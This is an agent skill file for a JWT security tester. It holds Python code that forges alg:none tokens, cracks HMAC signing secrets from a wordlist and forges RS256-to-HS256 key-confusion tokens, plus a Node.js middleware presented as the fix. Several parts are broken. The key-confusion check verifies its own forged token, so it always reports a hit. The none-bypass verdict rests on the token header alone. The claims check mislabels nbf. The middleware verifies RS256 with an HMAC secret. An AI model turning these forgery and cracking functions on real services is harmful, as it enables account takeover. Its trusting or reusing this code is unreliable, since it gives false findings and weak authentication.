---
id: jwt-security-cracker-tester
file_path: skills/jwt-security-cracker-tester/jwt-security-cracker-tester.md
name: JWT Security & Algorithm Cracker Tester
category: security
tags: [jwt, security-testing, cracking, api]
author: opencode-core
version: 1.0.0
description: Evaluates JSON Web Token handling on local API routes to identify token forgery, algorithm confusion, and weak signature secrets.
---

# JWT Security & Algorithm Cracker Tester

## 1. System Architecture & Prerequisites
- Python 3.10+ (stdlib only: `base64`, `json`, `hashlib`, `hmac`, `argparse`, `time`, `datetime`, `os`)
- Optional: `cryptography` package for RS256 signature verification (skipped gracefully if absent)
- Target: an intercepted JWT string plus an optional wordlist file and public key (PEM) location
- Wordlist format: one candidate secret per line (plain text)

## 2. Input/Output Data Contracts

**Input (CLI args):**
```json
{
  "type": "object",
  "properties": {
    "token": { "type": "string", "description": "JWT to analyze (three dot-separated base64url segments)" },
    "wordlist": { "type": "string", "description": "Path to candidate-secret wordlist (one per line)" },
    "report": { "type": "string", "description": "Output JSON report path", "default": "./jwt_report.json" },
    "pem": { "type": "string", "description": "Optional RSA public key PEM file used for key-confusion test" }
  },
  "required": ["token"]
}
```

**Output artifact:**
- `{report}` — JSON with `token_analysis`, `none_bypass`, `secret_cracked`, `claims_validation`, `key_confusion`

## 3. Production Reference Implementation

```python
#!/usr/bin/env python3
"""JWT Security & Algorithm Cracker Tester — manual JWT analysis, none-bypass, secret cracking, key confusion."""

import base64
import json
import hmac
import hashlib
import argparse
import os
import time
from datetime import datetime, timezone
from pathlib import Path


def b64url_decode(segment: str, padding: bool = True) -> bytes:
    """Decode a base64url segment to bytes, tolerating missing padding."""
    s = segment
    rem = len(s) % 4
    if padding and rem:
        s += "=" * (4 - rem)
    elif not padding:
        s += "=" * ((4 - rem) % 4)
    return base64.urlsafe_b64decode(s)


def b64url_encode(data: bytes) -> str:
    """Encode bytes to base64url without padding."""
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def parse_jwt(token: str) -> dict:
    """Decode header and payload of a JWT. Raises ValueError on malformed input."""
    parts = token.split(".")
    if len(parts) != 3:
        raise ValueError(f"Malformed JWT: expected 3 segments, got {len(parts)}")
    header = json.loads(b64url_decode(parts[0]).decode("utf-8", errors="replace"))
    payload = json.loads(b64url_decode(parts[1]).decode("utf-8", errors="replace"))
    signature = parts[2]
    signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
    return {
        "header": header,
        "payload": payload,
        "signature": signature,
        "signing_input": signing_input,
        "raw": token,
    }


def sign_jwt(header: dict, payload: dict, secret: str, algorithm: str = "HS256") -> str:
    """Sign a JWT using HS256/384/512 with the given secret."""
    header_b64 = b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    payload_b64 = b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{header_b64}.{payload_b64}".encode("ascii")

    if algorithm == "none":
        signature = ""
    elif algorithm in ("HS256", "HS384", "HS512"):
        digestmod = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[algorithm]
        signature = b64url_encode(hmac.new(secret.encode("utf-8"), signing_input, digestmod).digest())
    else:
        raise ValueError(f"Unsupported signing algorithm for secret: {algorithm}")

    return f"{header_b64}.{payload_b64}.{signature}"


def verify_hs(token: str, secret: str) -> bool:
    """Verify HS256/384/512 signature using constant-time-ish HMAC comparison."""
    header = parse_jwt(token)["header"]
    parts = token.split(".")
    try:
        digestmod = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[header.get("alg", "")]
    except KeyError:
        return False
    expected = hmac.new(
        secret.encode("utf-8"),
        f"{parts[0]}.{parts[1]}".encode("ascii"),
        digestmod,
    ).digest()
    actual = b64url_decode(parts[2])
    return hmac.compare_digest(actual, expected)


def verify_rs256(token: str, pem_path: str) -> dict:
    """Verify RS256 signature using cryptography RSA public key. Returns (ok, error)."""
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        from cryptography.hazmat.primitives import hashes as crypto_hashes
    except ImportError:
        return {"ok": False, "error": "cryptography not installed; RS256 verification skipped"}

    with open(pem_path, "rb") as fh:
        pubkey = serialization.load_pem_public_key(fh.read())

    parts = token.split(".")
    try:
        signature = b64url_decode(parts[2])
        pubkey.verify(
            signature,
            f"{parts[0]}.{parts[1]}".encode("ascii"),
            padding.PKCS1v15(),
            crypto_hashes.SHA256(),
        )
        return {"ok": True, "error": None}
    except Exception as exc:  # bad signature, wrong key, malformed data
        return {"ok": False, "error": str(exc)}


def test_none_bypass(token: str) -> dict:
    """Forge alg:none tokens with and without signature and report vulnerability."""
    parsed = parse_jwt(token)
    payload = dict(parsed["payload"])
    header_none = {"alg": "none", "typ": "JWT"}

    forged_none_sig = b64url_encode(json.dumps(header_none, separators=(",", ":")).encode("utf-8")) + "." + \
                      b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8")) + "."
    forged_none_unsigned = b64url_encode(json.dumps(header_none, separators=(",", ":")).encode("utf-8")) + "." + \
                           b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))

    forged = [forged_none_sig, forged_none_unsigned]

    alg_from_header = parsed["header"].get("alg", "")
    vulnerable = alg_from_header == "none" or "none" in str(parsed["header"]).lower()

    return {
        "vulnerable": vulnerable,
        "detected_alg": alg_from_header,
        "forged_none_tokens": forged,
        "note": "If the server accepts any forged token above, it is vulnerable to alg:none bypass (CWE-345/CWE-347).",
    }


def crack_hs256(token: str, wordlist_path: str) -> dict:
    """Brute-force HS256 signature against a wordlist. Uses timing-aware compare via hmac.compare_digest."""
    parsed = parse_jwt(token)
    alg = parsed["header"].get("alg", "")
    if alg not in ("HS256", "HS384", "HS512"):
        return {"secret": None, "method": f"cracked via wordlist (alg={alg} not HMAC; skipped)"}

    if not wordlist_path:
        return {"secret": None, "method": "no wordlist provided"}

    with open(wordlist_path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            candidate = line.strip()
            if not candidate:
                continue
            if verify_hs(token, candidate):
                return {"secret": candidate, "method": f"wordlist brute-force ({alg})"}
    return {"secret": None, "method": "wordlist exhausted; not found"}


def check_claims(payload: dict) -> dict:
    """Check presence and validity of standard claims."""
    now = int(time.time())
    missing = []
    issues = []

    if "exp" not in payload:
        missing.append("exp")
    elif payload["exp"] <= now:
        issues.append("exp is in the past (token expired)")
    else:
        # tolerances
        if payload["exp"] - now < 300:
            issues.append("exp expires within 5 minutes (tight window acceptable for short-lived tokens)")

    if "nbf" in payload and payload["nbf"] > now:
        issues.append("nbf is in the future (token not yet valid)")
    else:
        missing.append("nbf")

    if "iat" not in payload:
        missing.append("iat")
    elif payload["iat"] > now + 60:
        issues.append("iat is in the future (clock skew beyond 60s)")

    if "iss" not in payload:
        missing.append("iss")

    if "aud" not in payload:
        missing.append("aud")

    return {"missing": sorted(missing), "issues": issues, "verified_at": int(now)}


def test_key_confusion(token: str, pem_path: str) -> dict:
    """Test RS256 token re-verified as HS256 using PEM public key bytes as HMAC secret."""
    if not pem_path:
        return {"vulnerable": None, "note": "No PEM provided; key-confusion test skipped."}

    with open(pem_path, encoding="utf-8") as fh:
        pem_content = fh.read()

    parts = token.split(".")
    header = json.loads(b64url_decode(parts[0]).decode("utf-8"))
    original_alg = header.get("alg", "")

    forged = sign_jwt({"alg": "HS256", "typ": "JWT"}, json.loads(b64url_decode(parts[1]).decode("utf-8")), pem_content)
    verify_ok = verify_hs(forged, pem_content)

    recommend = (
        "Server must pin an allowed algorithm whitelist (e.g. jwt.verify(..., { algorithms: ['RS256'] })). "
        "Never derive the HS secret from the RSA public key bytes."
    )
    return {
        "vulnerable": verify_ok if original_alg in ("RS256", "RS384", "RS512", "none") else False,
        "original_alg": original_alg,
        "forged_hs256_token": forged,
        "hs256_verifies_with_pem": verify_ok,
        "recommendation": recommend,
    }


def generate_remediation_middleware(report_dir: Path) -> Path:
    """Write hardened Node.js JWT verify middleware to the report directory."""
    code = """const jwt = require('jsonwebtoken');

// HARDENED JWT verification middleware
// Fixes: algorithm confusion (CWE-347), none-bypass (CWE-345),
// missing claims validation (CWE-290), weak secret handling.
const JWT_SECRET = process.env.JWT_SECRET; // use a strong random secret: crypto.randomBytes(64).toString('hex')
const TOKEN_ALGORITHMS = Object.freeze(['RS256']); // whitelist ONLY the intended asymmetric algorithm
const TOKEN_MAX_AGE_MS = 900000; // 15 minutes

if (!JWT_SECRET && TOKEN_ALGORITHMS.includes('HS256')) {
  throw new Error('JWT_SECRET environment variable is required for HS256 tokens');
}

function verifyToken(req, res, next) {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer ')
    ? authHeader.slice('Bearer '.length).trim()
    : (req.cookies && req.cookies.access_token) || null;

  if (!token) {
    return res.status(401).json({ error: 'Missing bearer token' });
  }

  try {
    // 1. Whitelist algorithms -- defeats 'none' bypass and RS256->HS256 confusion
    // 2. maxAge enforces exp/nbf freshness
    // 3. issuer/audience pinned -- defeats forged iss/aud claims
    const payload = jwt.verify(token, JWT_SECRET, {
      algorithms: TOKEN_ALGORITHMS,
      maxAge: TOKEN_MAX_AGE_MS,
      issuer: process.env.JWT_ISSUER || 'auth-service',
      audience: process.env.JWT_AUDIENCE || 'api',
    });

    req.user = { id: payload.sub, role: payload.role, sessionId: payload.jti };
    next();
  } catch (err) {
    const reason =
      err.name === 'TokenExpiredError' ? 'EXPIRED' :
      err.name === 'JsonWebTokenError' ? 'INVALID' :
      err.name === 'NotBeforeError' ? 'NOT_YET_VALID' : 'FAILED';
    return res.status(401).json({ error: 'Unauthorized', code: reason });
  }
}

module.exports = { verifyToken, TOKEN_ALGORITHMS, TOKEN_MAX_AGE_MS };
"""
    path = report_dir / "hardened_jwt_middleware.js"
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(code, encoding="utf-8")
    return path


def build_report(token: str, wordlist: str, pem_path: str, report: str) -> dict:
    parsed = parse_jwt(token)
    payload = parsed["payload"]

    none = test_none_bypass(token)
    secret = crack_hs256(token, wordlist)
    claims = check_claims(payload)
    confusion = test_key_confusion(token, pem_path)

    report_dir = Path(report).parent
    middleware_path = generate_remediation_middleware(report_dir)

    report_data = {
        "target_token": token[:40] + "..." if len(token) > 40 else token,
        "token_analysis": {
            "header": parsed["header"],
            "payload": payload,
            "algorithm": parsed["header"].get("alg", "(missing)"),
        },
        "none_bypass": {"vulnerable": none["vulnerable"], "_test": none["note"]},
        "secret_cracked": {"secret": secret["secret"], "method": secret["method"]},
        "claims_validation": claims,
        "key_confusion": confusion,
        "remediation": {"middleware_file": str(middleware_path)},
        "summary": {
            "signature_forgery_risk": none["vulnerable"] or (confusion["vulnerable"] is True),
            "weak_secret_risk": secret["secret"] is not None,
            "claims_missing": claims["missing"],
        },
    }
    return report_data


def main():
    parser = argparse.ArgumentParser(
        description="JWT Security & Algorithm Cracker Tester — analyze, forge, crack, and validate JWTs.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    parser.add_argument("--token", required=True, help="JWT to analyze")
    parser.add_argument("--wordlist", default=None, help="Path to candidate-secret wordlist (one per line)")
    parser.add_argument("--report", default="./jwt_report.json", help="Output JSON report path")
    parser.add_argument("--pem", default=None, help="Optional RSA public key PEM for key-confusion test")
    args = parser.parse_args()

    try:
        report_data = build_report(args.token, args.wordlist, args.pem, args.report)
    except ValueError as exc:
        print(f"[ERROR] {exc}")
        raise SystemExit(1)

    report_path = Path(args.report)
    report_path.parent.mkdir(parents=True, exist_ok=True)
    report_path.write_text(json.dumps(report_data, indent=2, default=str), encoding="utf-8")
    print(json.dumps(report_data, indent=2, default=str))
    print(f"\n[INFO] Report written to {report_path}")


if __name__ == "__main__":
    main()
```

## 4. Execution Protocol & Step-by-Step Workflow
1. Capture an intercepted JWT from your local API (e.g. from browser devtools → Network → Authorization header).
2. Run the analyzer with the token:
   ```bash
   python jwt-security-cracker-tester.md --token eyJhbGciOiJIUzI1NiIs... --report ./jwt_report.json
   ```
3. Supply a wordlist to brute-force the HS256 secret:
   ```bash
   python jwt-security-cracker-tester.md --token <JWT> --wordlist ./secrets.txt
   ```
4. If the token is RS256-signed, pass the server's RSA public key PEM to test key confusion:
   ```bash
   python jwt-security-cracker-tester.md --token <JWT> --pem ./public_key.pem
   ```
5. Read `jwt_report.json`: check `none_bypass.vulnerable`, `secret_cracked.secret`, `claims_validation.missing`, `key_confusion.vulnerable`.
6. If any risk is `true`, deploy `hardened_jwt_middleware.js` into the Node API and mount it:
   ```js
   const { verifyToken } = require('./hardened_jwt_middleware');
   app.use('/api', verifyToken);
   ```
7. Re-test with the same forged tokens; they must now return 401.

## 5. Edge Cases & Error Handling
- Malformed tokens (wrong segment count, invalid base64url, non-JSON header/payload) raise a clear `ValueError` and exit non-zero with a message.
- Missing `cryptography` package: RS256 verification degrades gracefully with `ok: false` + `error: "cryptography not installed"` — the rest of the pipeline still runs.
- Wordlist files with CRLF or BOM are normalized (`errors="replace"`, `strip()`); blank lines skipped.
- Constant-time signature compare uses `hmac.compare_digest` to prevent timing side channels during cracking.
- Expired/empty-secret handling: `alg:none` forgery produces empty signatures that must be rejected by the server; the tool only reports the vector, never validating server behavior remotely.
- If `--pem` is a malformed key, key-confusion reports the exception message instead of crashing.
- Empty payload claims produce `missing: [...]` listing every standard claim, guiding remediation.